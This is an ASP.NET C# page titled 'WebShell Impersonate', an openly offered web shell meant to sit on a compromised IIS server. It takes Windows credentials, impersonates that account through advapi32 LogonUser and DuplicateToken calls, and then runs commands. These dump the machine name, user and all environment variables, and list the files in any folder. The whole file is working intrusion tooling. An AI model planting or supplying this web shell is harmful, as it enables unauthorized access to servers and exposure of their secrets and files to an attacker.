<!--
This webpage use to run all commands with parametrized user
-->

<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.ComponentModel" %>

<script language="c#" runat="server">

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int LogonUser(
               string lpszUserName,
               string lpszDomain,
               string lpszPassword,
               int dwLogonType,
               int dwLogonProvider,
               ref IntPtr phToken);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int DuplicateToken(
            IntPtr hToken,
            int impersonationLevel,
            ref IntPtr hNewToken);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool RevertToSelf();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool CloseHandle(
            IntPtr handle);

        private const int LOGON32_LOGON_INTERACTIVE = 2;
        private const int LOGON32_PROVIDER_DEFAULT = 0;


        class ExecuteResult
        {
            public bool IsError { get; set; }
            public string Message { get; set; }
        }

        class Impersonator : IDisposable
        {
            private WindowsImpersonationContext impersonationContext = null;


            public Impersonator(string userName, string domainName, string password)
            {
                ImpersonateValidUser(userName, domainName, password);
            }

            public void Dispose()
            {
                this.UndoImpersonation();
            }


            private void ImpersonateValidUser(
                    string userName,
                    string domain,
                    string password)
            {
                WindowsIdentity tempWindowsIdentity = null;
                IntPtr token = IntPtr.Zero;
                IntPtr tokenDuplicate = IntPtr.Zero;

                try
                {
                    if (RevertToSelf())
                    {
                        if (LogonUser(
                            userName,
                            domain,
                            password,
                            LOGON32_LOGON_INTERACTIVE,
                            LOGON32_PROVIDER_DEFAULT,
                            ref token) != 0)
                        {
                            if (DuplicateToken(token, 2, ref tokenDuplicate) != 0)
                            {
                                tempWindowsIdentity = new WindowsIdentity(tokenDuplicate);
                                impersonationContext = tempWindowsIdentity.Impersonate();

                            }
                            else
                            {
                                throw new Win32Exception(Marshal.GetLastWin32Error());
                            }
                        }
                        else
                        {
                            throw new Win32Exception(Marshal.GetLastWin32Error());
                        }
                    }
                    else
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                }
                finally
                {
                    if (token != IntPtr.Zero)
                    {
                        CloseHandle(token);
                    }
                    if (tokenDuplicate != IntPtr.Zero)
                    {
                        CloseHandle(tokenDuplicate);
                    }
                }
            }

            /// <summary>
            /// Reverts the impersonation.
            /// </summary>
            private void UndoImpersonation()
            {
                if (impersonationContext != null)
                {
                    impersonationContext.Undo();
                }
            }
        }
        void Page_Load(object sender, EventArgs e)
        {

            if (!IsPostBack)
            {

            }
        }

        void start()
        {
            string folder = Server.MapPath("~");
            StringBuilder sbl = new StringBuilder();
            sbl.Append("<table>");
            sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>Os Version</td><td> {0}</td></tr>", Environment.OSVersion);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr>", Environment.UserName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>Current Folder</td><td> {0}</td></tr></table>", folder);



            IDictionary environmentVariables = Environment.GetEnvironmentVariables();
            foreach (DictionaryEntry de in environmentVariables)
            {
                sbl.AppendLine();
                sbl.AppendFormat("<tr><td>{0}</td><td> {1}</td></tr></table>", de.Key, de.Value);
                Console.WriteLine("  {0} = {1}", de.Key, de.Value);
            }


            this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
        }

        void dir()
        {
        StringBuilder sbl = new StringBuilder();
            string[] folder = this.txtCommand.Text.Split(new char[] { ' ' });
            string[] files = Directory.GetFiles(folder[1]);
        sbl.Append("<table>");
            
            foreach (string f in files)
            {
                    sbl.AppendFormat("<tr><td>{0}</td></tr>", f);
            }
            sbl.Append("</table>");
           this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
    }



    private void addResult(string result)
    {
        this.dvResult.InnerHtml = "<hr/><div style='color:yellow'>" + DateTime.Now.ToString("HH:MM:ss") + "</div>" + result +
            this.dvResult.InnerHtml;
    }


    void cmdExe_Click(object sender, System.EventArgs e)
    {

        try
        {

            using (new Impersonator(this.txtUserName.Text, this.txtDomain.Text, this.txtPassword.Text))
            {
                if (this.txtCommand.Text.Equals("start"))
                {
                    this.start();
                }
                else if (this.txtCommand.Text.StartsWith("dir"))
                {
                    this.dir();
                }
            }
        }
        catch (Win32Exception wex)
        {
            this.dvResult.InnerHtml = "<div style='color:red'>User name or password is invalid</div>";
        }

    }

</script>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>WebShell Impersonate - Cyb3rb0b</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet"/>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>
</head>
<body id="body" runat="server">
    <form id="form1" runat="server">
          
        
          <pre id="dvResult" style="background-color:#000000;color:#FFF"  runat="server" class="">
            </pre>
         <div class="row">
            <div class="col-md-1">
                Domain
            </div>
            <div class="col-md-2">
                <asp:TextBox ID="txtDomain" runat="server" ></asp:TextBox>
            </div>
            <div class="col-md-1">
                UserName
            </div>
            <div class="col-md-2">
                <asp:TextBox ID="txtUserName" runat="server" ></asp:TextBox>
            </div>
            <div class="col-md-1">
                Password
            </div>
            <div class="col-md-2">
                <asp:TextBox ID="txtPassword" runat="server" ></asp:TextBox>
            </div>
            <div class="col-md-1">
                <asp:TextBox ID="txtCommand" runat="server"></asp:TextBox>
            </div>
            <div class="col-md-2">
                <asp:Button ID="cmdRun" runat="server" OnClick="cmdExe_Click" Text="Run" />
            </div>
        </div>
        
    </form>
</body>
</html>
